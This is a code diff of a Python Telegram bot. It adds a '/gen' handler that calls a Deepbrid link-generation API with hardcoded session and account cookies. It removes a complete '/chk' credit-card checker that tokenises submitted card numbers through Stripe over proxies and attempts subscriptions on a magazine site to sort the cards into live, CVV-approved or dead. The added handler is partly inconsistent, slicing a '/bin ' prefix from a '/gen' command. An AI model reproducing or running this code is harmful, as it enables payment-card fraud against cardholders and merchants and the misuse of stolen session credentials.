@@ -95,11 +95,16 @@ async def info(message: types.Message):
 <b>BOT-OWNER:</b> {await is_owner(user_id)}
 ╘═════════''')
 
-
+@dp.message_handler(commands=['gen'], commands_prefix=PREFIX)
+async def binio(message: types.Message):
+    await message.answer_chat_action('typing')
+    ID = message.from_user.id
+    FIRST = message.from_user.first_name
+    BIN = message.text[len('/bin '):]
 
     url = "https://www.deepbrid.com/backend-dl/index.php?page=api&action=generateLink"
     head={'content-type':'application/x-www-form-urlencoded; charset=UTF-8'}
-    data = f"link= {username}&pass=&boxlinklist=0"
+    data = f"link= {BIN}&pass=&boxlinklist=0"
     cookie= {'amember_ru':'rahulnova','amember_rp':'41b8739da7a1766af530a993a4a5c74d50bd1047','cookieconsent_status':'dismiss','crisp-client%2Fsession%2Fffca7959-dfd6-4915-90e2-b2feb57ae28e':'session_f5e79faa-8343-424c-a3cf-7241c05fd264','cf_clearance':'zsY5UafHGge9gvyNDPrjyaGI8oYnuOgf_.uUZ6CrXok-1655790566-0-150;adv1_closed=1','afscr8':'fIGyoi6Zo7pYdDF%2BivnhmPa7wwsNdWl5','PHPSESSID':'20bfbaf6632e67d47af4691b6dccdaf3'}
     y = requests.post(url, data=data,  headers=head,cookies=cookie).json
     if y["message"]=='OK':
@@ -115,156 +120,6 @@ async def info(message: types.Message):
                            f'**Time-Stamp** ==> {datetime.now()}\n'+
                            f'**Plugin-By** ~ @Stevenbin')
 
-
-@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
-async def ch(message: types.Message):
-    await message.answer_chat_action('typing')
-    tic = time.perf_counter()
-    ID = message.from_user.id
-    FIRST = message.from_user.first_name
-    try:
-        await dp.throttle('chk', rate=ANTISPAM)
-    except Throttled:
-        await message.reply('<b>Too many requests!</b>\n'
-                            f'Blocked For {ANTISPAM} seconds')
-    else:
-        if message.reply_to_message:
-            cc = message.reply_to_message.text
-        else:
-            cc = message.text[len('/chk '):]
-
-        if len(cc) == 0:
-            return await message.reply("<b>No Card to chk</b>")
-
-        x = re.findall(r'\d+', cc)
-        ccn = x[0]
-        mm = x[1]
-        yy = x[2]
-        cvv = x[3]
-        if mm.startswith('2'):
-            mm, yy = yy, mm
-        if len(mm) >= 3:
-            mm, yy, cvv = yy, cvv, mm
-        if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
-        BIN = ccn[:6]
-        if BIN in BLACKLISTED:
-            return await message.reply('<b>BLACKLISTED BIN</b>')
-        # get guid muid sid
-        headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
-        }
-
-        b = session.get('https://ip.seeip.org/', proxies=proxies).text
-
-        s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies)
-        r = s.json()
-        Guid = r['guid']
-        Muid = r['muid']
-        Sid = r['sid']
-
-        # hmm
-        load = {
-            "guid": Guid,
-            "muid": Muid,
-            "sid": Sid,
-            "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
-            "card[name]": Name,
-            "card[number]": ccn,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "card[cvc]": cvv
-        }
-
-        header = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
-        }
-
-        rx = session.post('https://api.stripe.com/v1/tokens',
-                          data=load, headers=header, proxies=proxies)
-        token = rx.json()['id']
-        LastF = f'************{ccn[-4:]}'
-
-        payload = {
-            "subscription_type": "digital",
-            "first_name": First,
-            "last_name": Last,
-            "email": Email,
-            "login_pass": PWD,
-            "confirm_pass": PWD,
-            "shipping_country": "United+States",
-            "card_number": LastF,
-            "card_cvc": cvv,
-            "card_expiry_month": mm,
-            "card_expiry_year": yy,
-            "action": "register",
-            "stripe_token": token,
-            "last4": token
-        }
-
-        head = {
-            "accept": "*/*",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "origin": "https://preludemag.com",
-            "referer": "https://preludemag.com/subscribe/",
-            "accept-language": "en-US,en;q=0.9"
-        }
-
-        ri = session.post('https://preludemag.com/subscribe/', data=payload,
-                          headers=head, proxies=proxies)
-        toc = time.perf_counter()
-
-        if 'success' in ri.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #ApprovedCVV
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'incorrect_cvc' in ri.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #ApprovedCCN
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'declined' in ri.text:
-            return await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ Declined
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
 
 
 if __name__ == '__main__':
